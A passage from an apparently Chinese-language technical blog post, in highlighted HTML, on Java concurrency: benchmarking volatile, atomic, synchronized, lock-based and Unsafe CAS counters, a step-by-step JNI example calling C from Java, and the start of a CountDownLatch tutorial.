        <span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span><span class="token punctuation">&gt;</span></span> action <span class="token operator">=</span> param <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token constant">THREAD_COUNT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">THREAD_COUNT</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CounterRunnable</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token constant">MAX_NUM</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 不可省略，需要等待执行线程运行结束</span>
                <span class="token comment">// 一般情况下awaitTermination和shutdown配合使用，shutdown之后调用awaitTermination</span>
                <span class="token comment">// 如果注释掉shutdown方法，则awaitTermination不会监视到线程池关闭的信息 所以在这个地方代码会堵塞，</span>
                <span class="token comment">// 如果注释掉awaitTermination方法，则后面的代码不会得到线程执行过的结果</span>
                executorService<span class="token punctuation">.</span><span class="token function">awaitTermination</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">HOURS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> action<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 统计运行时长
     *
     * @param action
     * @param counter
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">,</span> <span class="token class-name">Counter</span> counter<span class="token punctuation">,</span> <span class="token class-name">String</span> tag<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">long</span> begin <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 任务执行</span>
        action<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" counter result: "</span> <span class="token operator">+</span> counter<span class="token punctuation">.</span><span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" and time passed in ms: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> begin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">interface</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>
        <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">long</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">VolatileCounter</span> <span class="token keyword">implements</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">int</span> counter<span class="token punctuation">;</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token operator">++</span>counter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> counter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">AtomicCounter</span> <span class="token keyword">implements</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token class-name">AtomicInteger</span> counter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            counter<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> counter<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SynCounter</span> <span class="token keyword">implements</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token operator">++</span>counter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> counter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">LockCounter</span> <span class="token keyword">implements</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token operator">++</span>counter<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> counter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">CasCounter</span> <span class="token keyword">implements</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Unsafe</span> unsafe <span class="token operator">=</span> <span class="token function">getUnsafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> valueOffset<span class="token punctuation">;</span>

        <span class="token keyword">static</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                valueOffset <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">objectFieldOffset</span><span class="token punctuation">(</span><span class="token class-name">CasCounter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"counter"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>


        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> expect <span class="token operator">=</span> counter<span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>unsafe<span class="token punctuation">.</span><span class="token function">compareAndSwapInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> valueOffset<span class="token punctuation">,</span> expect<span class="token punctuation">,</span> expect <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                expect <span class="token operator">=</span> counter<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> counter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Unsafe</span> <span class="token function">getUnsafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Field</span> unsafe <span class="token operator">=</span> <span class="token class-name">Unsafe</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"theUnsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                unsafe<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Unsafe</span><span class="token punctuation">)</span> unsafe<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">CounterRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Counter</span> counter<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span>

        <span class="token class-name">CounterRunnable</span><span class="token punctuation">(</span><span class="token class-name">Counter</span> counter<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>counter <span class="token operator">=</span> counter<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">=</span> num<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>counter<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    counter<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Volatile</span> counter result<span class="token operator">:</span> <span class="token number">10000000</span> and time passed in ms<span class="token operator">:</span> <span class="token number">177</span>
<span class="token class-name">Executors</span> counter result<span class="token operator">:</span> <span class="token number">10000000</span> and time passed in ms<span class="token operator">:</span> <span class="token number">183</span>
<span class="token class-name">Sync</span> counter result<span class="token operator">:</span> <span class="token number">10000000</span> and time passed in ms<span class="token operator">:</span> <span class="token number">1111</span>
<span class="token class-name">Lock</span> counter result<span class="token operator">:</span> <span class="token number">10000000</span> and time passed in ms<span class="token operator">:</span> <span class="token number">204</span>
<span class="token class-name">Cas</span> counter result<span class="token operator">:</span> <span class="token number">10000000</span> and time passed in ms<span class="token operator">:</span> <span class="token number">114</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Java-调用-C-流程（JNI-）">Java 调用 C 流程（JNI ）</h3>
<ol>
<li>
<p>创建目录<code>jni</code></p>
</li>
<li>
<p>创建文件<code>Hello.java</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span><span class="token punctuation">{</span>
	<span class="token keyword">static</span><span class="token punctuation">{</span>
		<span class="token comment">// 加载动态链接库</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token comment">// 本地方法</span>
	<span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">new</span> <span class="token class-name">Hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>编译Java文件<code>javac Hello.java</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222105628308-1667231117133-83.png" alt="image-20220222105628308"></p>
</li>
<li>
<p>使用命令<code>javah -jni Hello</code>生成头文件<code>Hello.h</code>（C的header文件）</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222105835195-1667231117133-84.png" alt="image-20220222105835195"></p>
<p>Hello.h内容如下</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">/* DO NOT EDIT THIS FILE - it is machine generated */
#include &lt;jni.h&gt;
/* Header for class Hello */

#ifndef _Included_Hello
#define _Included_Hello
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     Hello
 * Method:    hi
 * Signature: ()V
 */
JNIEXPORT void JNICALL Java_Hello_hi
  (JNIEnv *, jobject);

#ifdef __cplusplus
}
#endif
#endif
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>编写C程序：<code>Hello.c</code>，也就是上面header文件中方法的实现</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;jni.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Hello.h"</span></span>

JNIEXPORT <span class="token keyword">void</span> JNICALL <span class="token function">Java_Hello_hi</span> <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span> env<span class="token punctuation">,</span> jobject o<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Say hi.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>查看<code>ls -l $JAVA_HOME/include</code></p>
</li>
<li>
<p>编译C文件<code>gcc -fPIC  -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -c Hello.c</code>，生成了<code>Hello.o</code>的目标文件</p>
</li>
<li>
<p>生成"hello" 的动态链接库 <code>gcc -shared Hello.o -o libhello.so</code>， 生成了<code>libhello.so</code>（<code>lib</code> 是linux约定俗成的前缀）</p>
</li>
<li>
<p>运行java文件：<code>java Hello</code>，报错</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Exception</span> in thread <span class="token string">"main"</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>UnsatisfiedLinkError</span><span class="token operator">:</span> no hello in java<span class="token punctuation">.</span>library<span class="token punctuation">.</span>path
	at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ClassLoader</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1867</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">loadLibrary0</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">870</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1122</span><span class="token punctuation">)</span>
	at <span class="token class-name">Hello</span><span class="token punctuation">.</span><span class="token generics"><span class="token punctuation">&lt;</span>clinit<span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">Hello</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>配置<code>java.library.path</code>. 临时生效：<code>export LD_LIBRARY_PATH=.</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222113453875-1667231117133-86.png" alt="image-20220222113453875"></p>
</li>
<li>
<p>重新运行：<code>java Hello</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222113625291-1667231117133-85.png" alt="image-20220222113625291"></p>
</li>
</ol>
<h2 id="底层汇编相关指令">底层汇编相关指令</h2>
<blockquote>
<p>compareAndSwapInt -&gt; cmpxchg1</p>
<p>compareAndSwapLong -&gt; cmpxchg</p>
<p>putOrderedInt -&gt; xchg1</p>
<p>compareAndSwapObject -&gt; cmpxchgq</p>
</blockquote>
<h1>CountDownLatch</h1>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">A</span> synchronization aid that allows one or more threads <span class="token keyword">to</span> <span class="token namespace">wait</span> until a set of operations being performed in other threads completes<span class="token punctuation">.</span>
“允许一个或多个线程等待，直到在其他线程中执行的一组操作完成”的同步算法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="退出条件">退出条件</h2>
<ol>
<li>countDown() 减到0：<code>await()</code></li>
<li>等待时间到了截止时间：<code>await(long timeout, TimeUnit unit)</code></li>
</ol>
<h2 id="使用场景">使用场景</h2>
<h3 id="等待所有线程执行完成">等待所有线程执行完成</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">hots<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">CountDownLatch</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicInteger</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CountDownLatchTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">AtomicInteger</span> count <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">CountDownLatch</span> latch<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token comment">// step1: 获取查询数据</span>
        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1_000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        latch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// step2：根据查询数据分配多个线程执行</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
